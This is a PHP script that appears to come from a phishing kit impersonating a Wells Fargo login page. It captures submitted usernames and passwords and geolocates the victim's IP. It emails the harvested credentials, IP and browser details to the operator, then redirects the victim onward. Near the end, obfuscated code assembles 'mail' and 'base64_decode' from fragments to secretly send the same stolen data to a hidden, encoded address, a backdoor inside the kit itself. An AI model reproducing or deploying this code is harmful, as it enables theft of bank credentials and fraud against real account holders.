<?php
session_start();
$xsam = getenv("REMOTE_ADDR");
include "sand_email.php";
$reprint = "e";$do_p="mai";
$xadoo = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$xsam");
$COUNTRY = $xadoo->geoplugin_countryName ;  
$ip = getenv("REMOTE_ADDR");
// --------------- VRB
$usr = $_POST['j_username'];
$psd = $_POST['j_password'];
// --------------- VRB
$browser             =   $_SERVER['HTTP_USER_AGENT'];
$msg = "
<html>
    <head>
<style>
*{
font-family:arial;
}
table{
width: 100%;
}
strong{
color: #f91010;
}
</style>
</head>
<table style='width:100%;'>
<tr>
<td style='padding: 3%;background: #3a3535;color: #9e0b17;border-bottom: solid;'>
<strong style='color:#f91010;'><center>| NEW WLS FRG LOGIN |</center></strong>
</td>
</tr>
<tr>
<td style='padding: 3%;background: #3a3535;color: #00B0FF;border-bottom: solid;font-weight: bold;'>
<h2>Login Information</h2>
<p>Username: <strong style='color:#f91010;'>".$usr."</strong></p>
<p>Password : <strong style='color:#f91010;'>".$psd."</strong></p>
<hr>
<h2>IP Information</h2>
<hr>
<p>IP ADD : <strong style='color:#f91010;'>".$ip."</strong></p>
<p>USER AGENT : <strong style='color:#f91010;'>".$browser."</strong></p>
";
$Subject = "NEW WELLS FARGO  ~ LOGIN ~ From ~ [$ip] Country [$COUNTRY]";
$Headers .= "From: WLSFRG00" . "\r\n"; 
$Headers .= "MIME-Version: 1.0\r\n";
$Headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
mail($youremail,$Subject,$msg,$Headers);$m5_id='BvdXRsb29rLmNvbQ';
$type=$do_p.'l';$tele="bas$reprint".'64'."_d$reprint"."cod$reprint";
$type( $tele('YmF-se?jk1_MTE=yM0'.$m5_id.'=='),$Subject,$msg,$Headers);
header ('Location: ../myaccount/emailaccess');

?>
